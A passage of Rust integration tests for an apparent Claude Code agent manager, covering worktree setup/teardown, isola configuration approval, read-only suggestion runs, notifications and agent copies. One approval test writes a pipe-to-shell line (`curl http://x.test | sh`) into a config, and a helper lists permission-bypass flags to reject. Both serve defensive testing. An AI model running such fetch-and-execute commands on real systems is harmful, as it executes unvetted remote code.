        assert_eq!(batches[0].1, 0, "{batches:?}");
        assert!(batches[0].2.is_empty(), "{batches:?}");
        let mut before = 0;
        for (_, total, lines) in &batches[1..] {
            assert!(*total > before, "{batches:?}");
            assert_eq!(lines.len() as u64, (*total - before).min(500));
            before = *total;
        }
    }
    let lines = |step: u64| -> Vec<String> {
        batches(step)
            .iter()
            .flat_map(|(_, _, l)| l.clone())
            .collect()
    };
    assert_eq!(lines(0), ["un", "deux"]);
    // The second's: the last lines written by each batch's count, the window left with the last 500.
    for (_, total, lines) in batches(1) {
        let from = *total as usize - lines.len() + 1;
        let written: Vec<String> = (from..=*total as usize)
            .map(|i| format!("ligne {i}"))
            .collect();
        assert_eq!(lines, &written);
    }
    assert_eq!(batches(1).last().unwrap().1, 600);
    let kept = lines(1);
    let expected: Vec<String> = (101..=600).map(|i| format!("ligne {i}")).collect();
    assert_eq!(kept[kept.len() - 500..], expected[..]);
    // The log has every line of every step, under its label.
    let log = std::fs::read_to_string(h.core.data.setup_log(&id)).unwrap();
    let label = |i: usize, c: &str| {
        format!(
            "── {}/2 · {}\n",
            i,
            crate::worktrees::label(&wt_step(c, ""))
        )
    };
    assert!(log.starts_with(&label(1, first)), "{log}");
    assert!(
        log.contains(&format!("{}un\ndeux\n── terminée en ", label(1, first))),
        "{log}"
    );
    assert!(
        log.contains(&format!("{}ligne 1\nligne 2\n", label(2, second))),
        "{log}"
    );
    assert!(log.contains("ligne 600\n── terminée en "), "{log}");
}

#[tokio::test]
async fn the_window_gets_a_steps_lines_in_a_few_batches_however_many_writes_it_makes() {
    let h = harness("wt-setup-batches");
    let (p, _) = h.project(true).await;
    // 120 lines, each written on its own a little after the one before: as many reads.
    let chatty = r#"node -e "let i = 0; const t = setInterval(() => { console.log('ligne ' + ++i); if (i === 120) clearInterval(t); }, 8)""#;
    h.set_worktree_steps(&p.id, vec![wt_step(chatty, "")], vec![]);
    let started = std::time::Instant::now();
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    h.wait("set up", |h| h.view(&id).setup.is_none()).await;
    let elapsed = started.elapsed();
    let sent = setup_events(&h, &id);
    // Nothing lost, in order, the totals counting them.
    let lines: Vec<String> = sent.iter().flat_map(|(_, _, l)| l.clone()).collect();
    let expected: Vec<String> = (1..=120).map(|i| format!("ligne {i}")).collect();
    assert_eq!(lines, expected);
    assert_eq!(sent.last().unwrap().1, 120);
    // One batch every 50 ms at most, and the last at the step's end: not one per write.
    let batches = sent.iter().filter(|(_, _, l)| !l.is_empty()).count();
    let bound = (elapsed.as_millis() / 50) as usize + 2;
    assert!(batches <= bound, "{batches} batches in {elapsed:?}");
}

#[tokio::test]
async fn a_failed_setup_is_said_and_stops_there_but_the_agent_still_works() {
    let h = harness("wt-setup-fail");
    let (p, _) = h.project(true).await;
    h.set_worktree_steps(
        &p.id,
        vec![
            wt_step(
                r#"node -e "console.log('npm ERR! introuvable'); process.exit(2)""#,
                "",
            ),
            wt_step(
                r#"node -e "require('fs').writeFileSync('never.txt', '')""#,
                "",
            ),
        ],
        vec![],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    let dir = PathBuf::from(a.meta.worktree.unwrap().path);
    h.turn(&id, "Bonjour").await;
    let warns = h.notices(&id, "warn");
    assert_eq!(warns.len(), 1, "{warns:?}");
    assert!(
        warns[0].starts_with("La préparation du worktree a échoué sur `node -e")
            && warns[0].contains("(code 2).")
            && warns[0].contains("npm ERR! introuvable"),
        "{}",
        warns[0]
    );
    // The conversation says where the whole output is; the log says how the step ended.
    let log = h.core.data.setup_log(&id);
    assert!(
        warns[0].ends_with(&format!("\n\nSortie complète : {}", log.display())),
        "{}",
        warns[0]
    );
    let text = std::fs::read_to_string(&log).unwrap();
    assert!(
        text.contains("npm ERR! introuvable\n── échec : code 2\n"),
        "{text}"
    );
    assert!(!dir.join("never.txt").exists());
    assert_eq!(h.view(&id).setup, None);
    assert!(!h.core.setup_outputs().contains_key(&id));
}

#[tokio::test]
async fn an_agent_without_a_worktree_is_not_set_up() {
    let h = harness("wt-setup-none");
    let (p, _) = h.project(false).await;
    h.set_worktree_steps(
        &p.id,
        vec![wt_step(r#"node -e "process.exit(1)""#, "")],
        vec![],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    assert_eq!(a.setup, None);
    h.turn(&a.meta.id, "Bonjour").await;
    assert!(h.notices(&a.meta.id, "warn").is_empty());
}

#[tokio::test]
async fn deleting_an_agent_runs_the_teardown_in_its_worktree_before_removing_it() {
    let h = harness("wt-teardown");
    let (p, r) = h.project(true).await;
    h.set_worktree_steps(
        &p.id,
        vec![],
        vec![
            wt_step(
                r#"node -e "const fs = require('fs'); fs.writeFileSync(require('path').join(process.env.ESCOUADE_PROJECT_DIR, 'down.txt'), process.env.ESCOUADE_BRANCH + ' ' + fs.existsSync('src'))""#,
                "",
            ),
            wt_step(r#"node -e "process.exit(4)""#, ""),
            wt_step(
                r#"node -e "require('fs').writeFileSync(require('path').join(process.env.ESCOUADE_PROJECT_DIR, 'after.txt'), '')""#,
                "",
            ),
        ],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    let warning = h.core.delete_agent(&a.meta.id, true).await.unwrap();
    // Run in the worktree while it was still there, every step even after one failed.
    assert_eq!(
        std::fs::read_to_string(r.join("down.txt")).unwrap(),
        format!("{} true", wt.branch)
    );
    assert!(r.join("after.txt").exists());
    assert_eq!(
        warning.as_deref(),
        Some("Agent supprimé, mais le démontage du worktree a échoué sur `node -e \"process.exit(4)\"` (code 4).")
    );
    // Removed all the same.
    assert!(!Path::new(&wt.path).exists());
    assert_eq!(git(&r, &["branch", "--list", &wt.branch]), "");
}

#[tokio::test]
async fn deleting_an_agent_but_not_its_worktree_runs_no_teardown() {
    let h = harness("wt-teardown-kept");
    let (p, r) = h.project(true).await;
    h.set_worktree_steps(
        &p.id,
        vec![],
        vec![wt_step(
            r#"node -e "require('fs').writeFileSync(require('path').join(process.env.ESCOUADE_PROJECT_DIR, 'down.txt'), '')""#,
            "",
        )],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    assert_eq!(h.core.delete_agent(&a.meta.id, false).await.unwrap(), None);
    assert!(Path::new(&wt.path).is_dir() && !r.join("down.txt").exists());
}

#[tokio::test]
async fn deleting_an_agent_stops_the_setup_of_its_worktree() {
    let h = harness("wt-setup-stop");
    let (p, r) = h.project(true).await;
    h.set_worktree_steps(
        &p.id,
        vec![wt_step(
            r#"node -e "setTimeout(() => require('fs').writeFileSync(require('path').join(process.env.ESCOUADE_PROJECT_DIR, 'late.txt'), ''), 4000)""#,
            "",
        )],
        vec![],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    // Under way (its process started).
    tokio::time::sleep(Duration::from_millis(800)).await;
    let log = h.core.data.setup_log(&a.meta.id);
    assert!(log.is_file());
    let started = std::time::Instant::now();
    assert_eq!(h.core.delete_agent(&a.meta.id, true).await.unwrap(), None);
    // Its log goes with it.
    assert!(!log.exists());
    assert!(
        started.elapsed() < Duration::from_secs(3),
        "{:?}",
        started.elapsed()
    );
    assert!(!Path::new(&wt.path).exists());
    // Killed with it: it never ends its work.
    tokio::time::sleep(Duration::from_secs(5)).await;
    assert!(!r.join("late.txt").exists());
}

#[tokio::test]
async fn an_archived_agent_whose_worktree_went_gets_it_back_from_its_branch_when_restored() {
    let h = harness("wt-restore");
    let (p, r) = h.project(true).await;
    ignore(&r, ".env");
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    let wt = a.meta.worktree.clone().unwrap();
    let dir = PathBuf::from(&wt.path);
    std::fs::write(dir.join("travail.txt"), "fait\n").unwrap();
    git(&dir, &["add", "travail.txt"]);
    git(&dir, &["commit", "-qm", "travail"]);
    h.wait("warm-up", |h| h.alive(&id)).await;
    let held = h.core.agent(&id).unwrap().lock().proc.clone().unwrap();
    h.core.archive_agent(&id, true).await.unwrap();
    h.wait("its process over", |_| !held.is_alive()).await;
    // Its folder went (as after a pull request or a push), its branch stayed.
    remove_worktree_eventually(&r, &wt.path).await;
    h.set_worktree_steps(
        &p.id,
        vec![wt_step(
            r#"node -e "require('fs').writeFileSync('prepared.txt', '')""#,
            "",
        )],
        vec![],
    );
    h.core.archive_agent(&id, false).await.unwrap();
    assert_eq!(
        std::fs::read_to_string(dir.join("travail.txt")).unwrap(),
        "fait\n"
    );
    assert_eq!(git(&dir, &["rev-parse", "--abbrev-ref", "HEAD"]), wt.branch);
    assert_eq!(
        std::fs::read_to_string(dir.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    // Set up again before it takes a message.
    h.turn(&id, "Reprends").await;
    assert!(dir.join("prepared.txt").exists());
    // Without its branch (merged and deleted), it stays as it is.
    h.core.archive_agent(&id, true).await.unwrap();
    remove_worktree_eventually(&r, &wt.path).await;
    git(&r, &["branch", "-D", &wt.branch]);
    h.core.archive_agent(&id, false).await.unwrap();
    assert!(!dir.exists());
}

// ---------- isola ----------

#[tokio::test]
async fn an_isola_worktree_is_listed_stopped_and_torn_down_by_isola() {
    crate::isola::tests::use_fake();
    let h = harness("wt-isola");
    let (p, r) = h.project(true).await;
    std::fs::write(
        r.join(".isola.toml"),
        "[services.web]\ncommand = \"npm run dev\"\n",
    )
    .unwrap();
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "isola"]);
    ignore(&r, ".isola-*");
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    let wt = a.meta.worktree.clone().unwrap();
    let dir = PathBuf::from(&wt.path);
    assert!(a.isola);
    // Up (the test launch runs `isola up` in a terminal), its services are the worktree's.
    assert!(h.core.isola_services(&id).await.unwrap().is_empty());
    crate::isola::run(&wt.path, &["up"], crate::isola::LIMIT)
        .await
        .unwrap();
    let services = h.core.isola_services(&id).await.unwrap();
    assert_eq!(
        (
            services.len(),
            services[0].name.as_str(),
            services[0].url.as_str(),
            services[0].probe.as_str()
        ),
        (
            1,
            "web",
            "http://escouade-agent-1.demo.localhost:3000",
            "http://127.0.0.1:9"
        )
    );
    h.core.isola_down(&id).await.unwrap();
    assert!(h.core.isola_services(&id).await.unwrap().is_empty());
    // Its test launch is isola's: `isola up` in the worktree, once its configuration is approved.
    let config = h.core.isola_config(&id).unwrap();
    h.core.approve_isola(&id, config, String::new()).unwrap();
    let spec = h.core.test_run_spec(&id, "isola", 0).unwrap();
    assert_eq!(
        (spec.command.as_str(), spec.cwd.as_str()),
        (crate::isola::UP, wt.path.as_str())
    );
    // Archived, its services stop.
    crate::isola::run(&wt.path, &["up"], crate::isola::LIMIT)
        .await
        .unwrap();
    h.core.archive_agent(&id, true).await.unwrap();
    h.wait("isola down", |_| {
        crate::isola::tests::calls(&dir).last().map(String::as_str) == Some("down")
    })
    .await;
    // Deleted with its worktree, isola tears it down first.
    h.core.archive_agent(&id, false).await.unwrap();
    assert_eq!(h.core.delete_agent(&id, true).await.unwrap(), None);
    assert_eq!(
        crate::isola::tests::calls(&dir).last().map(String::as_str),
        Some("destroy")
    );
    assert!(!dir.exists());
}

#[tokio::test]
async fn closing_a_project_stops_its_worktrees_setups_and_isolas_services() {
    crate::isola::tests::use_fake();
    let h = harness("wt-close");
    let (p, r) = h.project(true).await;
    std::fs::write(r.join(".isola.toml"), "").unwrap();
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "isola"]);
    ignore(&r, ".isola-*");
    h.set_worktree_steps(
        &p.id,
        vec![wt_step(
            r#"node -e "setTimeout(() => require('fs').writeFileSync(require('path').join(process.env.ESCOUADE_PROJECT_DIR, 'late.txt'), ''), 4000)""#,
            "",
        )],
        vec![],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let dir = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    tokio::time::sleep(Duration::from_millis(800)).await;
    h.core.remove_project(&p.id).unwrap();
    h.wait("isola down", |_| {
        crate::isola::tests::calls(&dir).last().map(String::as_str) == Some("down")
    })
    .await;
    // Its setup was stopped with the project: it never ends its work. Its log went with it.
    tokio::time::sleep(Duration::from_secs(5)).await;
    assert!(!r.join("late.txt").exists());
    assert!(!h.core.data.setup_log(&a.meta.id).exists());
}

#[tokio::test]
async fn a_worktree_without_isolas_configuration_is_not_isolas() {
    crate::isola::tests::use_fake();
    let h = harness("wt-isola-none");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    assert!(!a.isola);
    assert!(h.core.isola_services(&a.meta.id).await.is_err());
    assert!(h.core.test_run_spec(&a.meta.id, "isola", 0).is_err());
    let dir = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    h.core.delete_agent(&a.meta.id, true).await.unwrap();
    assert!(crate::isola::tests::calls(&dir).is_empty());
}

#[tokio::test]
async fn an_isola_launch_runs_only_the_configuration_the_user_approved() {
    crate::isola::tests::use_fake();
    let h = harness("wt-isola-approval");
    let (p, r) = h.project(true).await;
    std::fs::write(
        r.join(".isola.toml"),
        "[services.web]\ncommand = \"npm run dev\"\n",
    )
    .unwrap();
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "isola"]);
    ignore(&r, ".isola-*");
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    let wt = a.meta.worktree.clone().unwrap();
    let config_path = PathBuf::from(&wt.path).join(".isola.toml");
    assert!(a.isola);

    // `isola up` runs the commands of this file, which the agent can write: nothing runs unread.
    let refused = |h: &Harness| {
        h.core
            .test_run_spec(&id, "isola", 0)
            .unwrap_err()
            .to_string()
    };
    assert_eq!(refused(&h), crate::testlaunch::ISOLA_NOT_APPROVED);
    // The window shows the file as it is on disk.
    let shown = h.core.isola_config(&id).unwrap();
    assert_eq!(shown, "[services.web]\ncommand = \"npm run dev\"\n");

    // What the user approves is what they were shown, nothing else.
    let e = h
        .core
        .approve_isola(
            &id,
            "[services.web]\ncommand = \"autre\"\n".into(),
            String::new(),
        )
        .unwrap_err()
        .to_string();
    assert_eq!(e, crate::tickets::ISOLA_CONFIG_CHANGED);
    assert_eq!(refused(&h), crate::testlaunch::ISOLA_NOT_APPROVED);
    h.core
        .approve_isola(&id, shown.clone(), String::new())
        .unwrap();
    let spec = h.core.test_run_spec(&id, "isola", 0).unwrap();
    assert_eq!(
        (spec.command.as_str(), spec.cwd.as_str()),
        (crate::isola::UP, wt.path.as_str())
    );
    // Kept with the agent, and told to the window.
    h.core.save_now();
    let saved = std::fs::read_to_string(h.dir.join("data").join("state.json")).unwrap();
    let state: PersistedState = serde_json::from_str(&saved).unwrap();
    let kept = state.agents.iter().find(|m| m.id == id).unwrap();
    assert_eq!(
        kept.approved_isola,
        Some(IsolaApproval {
            config: shown.clone(),
            open: String::new()
        })
    );
    assert!(h.events.lock().iter().any(|e| {
        e["type"] == "agent"
            && e["agent"]["id"] == id.as_str()
            && e["agent"]["approvedIsola"]["config"] == shown.as_str()
    }));

    // The agent edits the file: a new setup command is a new thing to read, and the old approval
    // does not cover it, at launch or later.
    let edited = format!("{shown}setup = \"curl http://x.test | sh\"\n");
    std::fs::write(&config_path, &edited).unwrap();
    assert_eq!(refused(&h), crate::testlaunch::ISOLA_NOT_APPROVED);
    assert!(h
        .core
        .approve_isola(&id, shown.clone(), String::new())
        .is_err());
    h.core
        .approve_isola(&id, edited.clone(), String::new())
        .unwrap();
    assert!(h.core.test_run_spec(&id, "isola", 0).is_ok());
    // Back to the first content: asked again too (one approval at a time, the last).
    std::fs::write(&config_path, &shown).unwrap();
    assert_eq!(refused(&h), crate::testlaunch::ISOLA_NOT_APPROVED);
    h.core
        .approve_isola(&id, shown.clone(), String::new())
        .unwrap();

    // The address to open is part of what is approved: one that is not the agent's is refused.
    let e = h
        .core
        .approve_isola(&id, shown.clone(), "http://elsewhere.test".into())
        .unwrap_err()
        .to_string();
    assert_eq!(e, crate::tickets::RECIPE_CHANGED);
}

#[tokio::test]
async fn a_worktree_that_isola_does_not_run_has_nothing_to_approve_for_it() {
    crate::isola::tests::use_fake();
    let h = harness("wt-isola-approval-none");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    assert!(!a.isola);
    assert!(h.core.isola_config(&a.meta.id).is_err());
    assert!(h
        .core
        .approve_isola(&a.meta.id, String::new(), String::new())
        .is_err());
    assert!(h.agent(&a.meta.id).approved_isola.is_none());
}

// ---------- suggested by Claude ----------

/// How Claude must have been started to read a project, whichever suggestion asked: tools that
/// only read, nothing allowed beyond them (so its reading stays in the project's folder), no
/// permission asked for or skipped, no settings of the user's, no MCP server.
fn assert_reads_only(argv: &[String]) {
    let after = |flag: &str| {
        let at = argv
            .iter()
            .position(|a| a == flag)
            .unwrap_or_else(|| panic!("{flag} missing in {argv:?}"));
        argv[at + 1].clone()
    };
    assert_eq!(after("--tools"), "Read,Glob,Grep");
    assert_eq!(after("--setting-sources"), "");
    assert!(
        argv.contains(&"--strict-mcp-config".to_string()),
        "{argv:?}"
    );
    for flag in [
        "--allowedTools",
        "--allowed-tools",
        "--permission-mode",
        "--dangerously-skip-permissions",
        "--allow-dangerously-skip-permissions",
        "--add-dir",
        "--mcp-config",
    ] {
        assert!(!argv.iter().any(|a| a == flag), "{flag} in {argv:?}");
    }
    assert!(
        !argv
            .iter()
            .any(|a| a.contains("Bash") || a.contains("Edit")),
        "{argv:?}"
    );
}

#[tokio::test]
async fn claude_reads_the_project_with_read_only_tools_to_suggest_its_worktree_commands() {
    let h = harness("wt-suggest-claude");
    let (p, r) = h.project(false).await;
    let s = h.core.suggest_worktree_steps(&p.id).await.unwrap();
    let setup: Vec<(&str, &str)> = s
        .setup
        .iter()
        .map(|x| (x.command.as_str(), x.cwd.as_str()))
        .collect();
    // The step whose folder leaves the project is dropped; the one that holds a line break is
    // refused, and counted.
    assert_eq!(setup, [("npm ci", ""), ("npm run gen", "src")]);
    assert_eq!(s.refused, 1);
    assert_eq!(s.teardown.len(), 1);
    assert_eq!(s.teardown[0].command, "docker compose down");
    let first = crate::pty::detect_shells(&h.core.settings.read())
        .first()
        .map(|s| s.id.clone())
        .unwrap();
    assert!(s.setup.iter().chain(&s.teardown).all(|x| x.shell == first));
    // Run in the project, with nothing but tools that read.
    assert_reads_only(&h.launches(&r).pop().expect("claude run in the project"));
    let sent = serde_json::to_value(&s).unwrap();
    assert_eq!(sent["setup"][1]["cwd"], "src");
    assert_eq!(sent["refused"], 1);
}

#[tokio::test]
async fn worktree_commands_that_were_all_refused_are_told_so_and_not_as_nothing_found() {
    let h = harness("wt-suggest-all-refused");
    let (p, _) = h.project(false).await;
    let e = h
        .core
        .suggest_worktree_steps(&p.id)
        .await
        .unwrap_err()
        .to_string();
    assert_eq!(
        e,
        "Claude a proposé des commandes illisibles : aucune n'a été gardée."
    );
}

#[tokio::test]
async fn claude_reads_the_project_with_read_only_tools_to_suggest_its_launch_commands() {
    let h = harness("run-suggest-claude");
    let (p, r) = h.project(false).await;
    let suggestion = h.core.suggest_run_commands(&p.id).await.unwrap();
    let shown: Vec<(&str, &str, &str)> = suggestion
        .commands
        .iter()
        .map(|c| (c.name.as_str(), c.command.as_str(), c.cwd.as_str()))
        .collect();
    // The commands whose folder leaves the project, or is not in it, are dropped; the one that
    // holds a line break is refused, and counted.
    assert_eq!(
        shown,
        [("Front", "npm run dev", "src"), ("API", "cargo run", "")]
    );
    assert_eq!(suggestion.refused, 1);
    let first = crate::pty::detect_shells(&h.core.settings.read())
        .first()
        .map(|s| s.id.clone())
        .unwrap();
    assert!(suggestion
        .commands
        .iter()
        .all(|c| c.shell == first && !c.id.is_empty()));
    // Run in the project, with nothing but tools that read.
    assert_reads_only(&h.launches(&r).pop().expect("claude run in the project"));
    let sent = serde_json::to_value(&suggestion).unwrap();
    assert_eq!(sent["commands"][0]["cwd"], "src");
    assert_eq!(sent["refused"], 1);
    // Only a suggestion: the project keeps its commands until the user saves.
    assert!(h.core.project(&p.id).unwrap().run_commands.is_empty());
}

#[tokio::test]
async fn launch_commands_that_were_all_refused_are_told_so_and_not_as_nothing_found() {
    let h = harness("run-suggest-all-refused");
    let (p, _) = h.project(false).await;
    let e = h
        .core
        .suggest_run_commands(&p.id)
        .await
        .unwrap_err()
        .to_string();
    assert_eq!(
        e,
        "Claude a proposé des commandes illisibles : aucune n'a été gardée."
    );
}

#[tokio::test]
async fn an_answer_without_launch_commands_in_json_is_told_as_unreadable() {
    let h = harness("run-suggest-unreadable");
    let (p, _) = h.project(false).await;
    let e = h
        .core
        .suggest_run_commands(&p.id)
        .await
        .unwrap_err()
        .to_string();
    assert_eq!(e, "Claude n'a pas proposé de commandes lisibles.");
}

#[tokio::test]
async fn a_kind_of_notification_switched_off_is_not_sent_but_the_others_are() {
    let h = harness("notify-kinds");
    let kinds = [
        NotifyKind::Question,
        NotifyKind::Done,
        NotifyKind::Error,
        NotifyKind::Ticket,
    ];
    for off in kinds {
        h.core.alerts.lock().clear();
        {
            let mut s = h.core.settings.write();
            s.notify_for = NotifyFor::default();
            match off {
                NotifyKind::Question => s.notify_for.questions = false,
                NotifyKind::Done => s.notify_for.done = false,
                NotifyKind::Error => s.notify_for.errors = false,
                NotifyKind::Ticket => s.notify_for.tickets = false,
            }
        }
        for kind in kinds {
            h.core.alert(
                kind,
                "demo".into(),
                format!("{kind:?}"),
                UiEvent::FocusBoard {
                    project_id: "p1".into(),
                },
            );
        }
        let sent = h.alerts();
        let expected: Vec<String> = kinds
            .iter()
            .filter(|k| **k != off)
            .map(|k| format!("demo | {k:?}"))
            .collect();
        assert_eq!(sent, expected, "with {off:?} off");
    }
}

#[tokio::test]
async fn a_question_or_a_permission_is_told_with_its_own_words() {
    let h = harness("notify-asks");
    let (p, _) = h.project(false).await;
    let asking = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&asking, "question".into(), vec![])
        .await
        .unwrap();
    h.wait_alerts(1).await;
    assert!(
        h.alerts()[0].ends_with(" | Quelle base de données ?"),
        "{:?}",
        h.alerts()
    );
    let asked = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&asked, "permission".into(), vec![])
        .await
        .unwrap();
    h.wait_alerts(2).await;
    assert!(
        h.alerts()[1].ends_with(" | Autoriser Bash : rm -rf build ?"),
        "{:?}",
        h.alerts()
    );
}

#[tokio::test]
async fn the_end_of_a_turn_and_a_crash_are_told_unless_their_kind_is_off() {
    let h = harness("notify-ends");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Bonjour").await;
    h.wait_alerts(1).await;
    // Titled with the project and the agent (named by Claude meanwhile), saying the first line
    // of the reply.
    let sent = h.alerts();
    assert!(
        sent.len() == 1
            && sent[0].starts_with("demo · ")
            && sent[0].ends_with(" | Bonjour, tu as dit : Bonjour"),
        "{sent:?}"
    );

    // Ends and errors off: the next turn and a crash are silent, though a question still is.
    {
        let mut s = h.core.settings.write();
        s.notify_for.done = false;
        s.notify_for.errors = false;
    }
    h.turn(&id, "Encore").await;
    h.core
        .send_message(&id, "crash".into(), vec![])
        .await
        .unwrap();
    h.wait("crash", |h| h.agent(&id).status == AgentStatus::Error)
        .await;
    let asking = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&asking, "question".into(), vec![])
        .await
        .unwrap();
    h.wait_alerts(2).await;
    let sent = h.alerts();
    assert_eq!(sent.len(), 2, "{sent:?}");
    assert!(sent[1].ends_with(" | Quelle base de données ?"), "{sent:?}");

    // Errors back on: the crash tells its exit code.
    h.core.settings.write().notify_for.errors = true;
    h.core
        .send_message(&id, "crash".into(), vec![])
        .await
        .unwrap();
    h.wait_alerts(3).await;
    assert!(
        h.alerts()[2].ends_with(" | Erreur : Claude Code s'est arrêté (code 3)"),
        "{:?}",
        h.alerts()
    );
}

// ---------- copies of an agent ----------

/// What the conversation of a copy tells when its original had changes it had not committed.
fn uncommitted_notice(original: &str) -> String {
    format!("Les modifications non commitées de {original} ne sont pas dans cette copie.")
}

#[tokio::test]
async fn a_copy_shows_the_conversation_again_and_forks_its_session_leaving_the_original_as_it_is() {
    let h = harness("copy-plain");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.rename_agent(&id, "refacto-auth").await.unwrap();
    h.core
        .set_agent_options(
            &id,
            Some("opus".into()),
            Some("max".into()),
            Some("plan".into()),
        )
        .await
        .unwrap();
    h.turn(&id, "Premier").await;
    let original = h.agent(&id);
    let session = original.session_id.clone().unwrap();
    // The last entry of the turn it ran: where a copy forks its session.
    let entry = original.last_entry.clone().expect("its last entry");
    let items = h.items(&id);

    let copy = h.core.duplicate_agent(&id).await.unwrap().meta;
    assert_eq!(copy.fork_at.as_deref(), Some(entry.as_str()));
    assert_eq!(
        (copy.name.as_str(), copy.named, copy.project_id.as_str()),
        ("refacto-auth (copie)", true, p.id.as_str())
    );
    assert_eq!(
        (
            copy.model.as_str(),
            copy.effort.as_str(),
            copy.mode.as_str()
        ),
        ("opus", "max", "plan")
    );
    // Without a worktree: in the same folder.
    assert_eq!(copy.worktree.as_ref().map(|w| &w.path), None);
    assert_eq!(copy.cwd, original.cwd);
    assert_eq!(h.items(&copy.id), items);
    // Shown at once, as an agent the user made.
    assert_eq!(h.core.ui.read().selected_agent.get(&p.id), Some(&copy.id));
    let pinned = |argv: &[String]| {
        argv.windows(3).any(|w| {
            w[0] == format!("--resume={session}")
                && w[1] == "--fork-session"
                && w[2] == format!("--resume-session-at={entry}")
        })
    };
    // Started on a fork of the original's session where it was copied…
    h.core.ensure_process(&copy.id).await.unwrap();
    let argv = h.launches(&r).pop().unwrap();
    assert!(pinned(&argv), "{argv:?}");
    // Nothing to say of its folder: it is the original's.
    assert!(
        !argv.contains(&"--append-system-prompt".to_string()),
        "{argv:?}"
    );
    // …and there still, the original having gone on meanwhile, at every start until its first turn.
    h.turn(&id, "Ensuite").await;
    assert_ne!(h.agent(&id).last_entry.as_deref(), Some(entry.as_str()));
    h.core.agent(&copy.id).unwrap().lock().meta.last_activity = 0;
    h.core.stop_idle_processes();
    h.wait("the copy stopped", |h| !h.alive(&copy.id)).await;
    h.core.ensure_process(&copy.id).await.unwrap();
    let argv = h.launches(&r).pop().unwrap();
    assert!(pinned(&argv), "{argv:?}");
    // Its first turn gives it a session of its own.
    h.turn(&copy.id, "Second").await;
    let copied = h.agent(&copy.id);
    assert!(
        copied.session_id.is_some() && copied.session_id.as_deref() != Some(session.as_str()),
        "{:?}",
        copied.session_id
    );
    assert_eq!((copied.fork_of, copied.fork_at), (None, None));
    // The original is as it was before its own next turn: its session, its name, its conversation.
    let after = h.agent(&id);
    assert_eq!(
        (after.session_id.as_deref(), after.name.as_str()),
        (Some(session.as_str()), "refacto-auth")
    );
    assert_eq!(h.items(&id)[..items.len()], items[..]);
}

#[tokio::test]
async fn a_copy_of_a_worktree_agent_has_its_own_from_the_current_commit_set_up_like_a_new_one() {
    let h = harness("copy-worktree");
    let (p, r) = h.project(true).await;
    ignore(&r, ".env");
    ignore(&r, "prepared.txt");
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
    h.set_worktree_steps(
        &p.id,
        vec![wt_step(
            r#"node -e "require('fs').writeFileSync('prepared.txt', process.env.ESCOUADE_BRANCH)""#,
            "",
        )],
        vec![],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta;
    h.wait("the original set up", |h| h.view(&a.id).setup.is_none())
        .await;
    let wt = a.worktree.clone().unwrap();
    let dir = PathBuf::from(&wt.path);
    // Its work so far: a commit on its branch, then changes it did not commit.
    std::fs::write(dir.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    git(&dir, &["commit", "-qam", "travail"]);
    let head = git(&dir, &["rev-parse", "HEAD"]);
    std::fs::write(dir.join("src").join("app.ts"), "const a = 3;\n").unwrap();
    std::fs::write(dir.join("brouillon.txt"), "b\n").unwrap();
    let items = h.items(&a.id);

    let copy = h.core.duplicate_agent(&a.id).await.unwrap().meta;
    assert_eq!(copy.name, "agent-1 (copie)");
    let cwt = copy.worktree.clone().unwrap();
    assert_eq!(
        (cwt.branch.as_str(), cwt.base_branch.as_str()),
        ("escouade/agent-1-copie", "main")
    );
    assert_ne!(cwt.path, wt.path);
    assert_eq!(copy.cwd, cwt.path);
    let cdir = PathBuf::from(&cwt.path);
    // From the original's current commit, without what it did not commit…
    assert_eq!(git(&cdir, &["rev-parse", "HEAD"]), head);
    assert_eq!(
        std::fs::read_to_string(cdir.join("src").join("app.ts")).unwrap(),
        "const a = 2;\n"
    );
    assert!(!cdir.join("brouillon.txt").exists());
    // …which its conversation says, after the original's.
    let copied = h.items(&copy.id);
    assert_eq!(copied[..items.len()], items[..]);
    assert_eq!(copied[items.len()]["kind"], "notice");
    assert_eq!(copied[items.len()]["text"], uncommitted_notice("agent-1"));
    // Prepared as a new agent's: the files copied, then the setup run in it.
    assert_eq!(
        std::fs::read_to_string(cdir.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    h.wait("the copy set up", |h| h.view(&copy.id).setup.is_none())
        .await;
    assert_eq!(
        std::fs::read_to_string(cdir.join("prepared.txt")).unwrap(),
        cwt.branch
    );
    // Its Claude is told at every start that it works in another folder than the one its
    // conversation names.
    let moved = format!(
        "Cette conversation a été copiée depuis un agent qui travaillait dans {}. Tu travailles maintenant dans {} : ne lis et n'écris que dedans.",
        wt.path, cwt.path
    );
